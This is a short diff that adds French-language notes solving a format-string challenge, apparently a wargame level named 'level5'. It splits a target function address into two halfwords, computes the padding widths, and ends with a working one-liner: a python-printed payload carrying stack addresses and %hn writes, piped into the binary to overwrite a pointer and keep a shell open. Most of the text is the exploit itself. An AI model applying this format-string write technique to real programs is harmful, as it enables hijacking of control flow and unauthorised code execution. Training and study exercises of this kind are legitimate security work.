@@ -1,0 +1,12 @@
+https://hacktion.be/format-strings/
+
+adresse de la fonction o : 0x80484a4
+qui se décompose en :
+0x0804 : 2052
+0x84a4 : 33956
+on retire 8 octets pour l'écriture des 2 adresses donc 
+X = 2052 -8 = 2044
+et on a déjà écrit 2052caractères donc 
+Y = 33956 - 2052 = 31904
+
+ (python -c 'print "\xdc\xf4\xff\xbf\xde\xf4\xff\xbf%2044d%5$hn%31904d%4$hn"'; cat) | ./level5
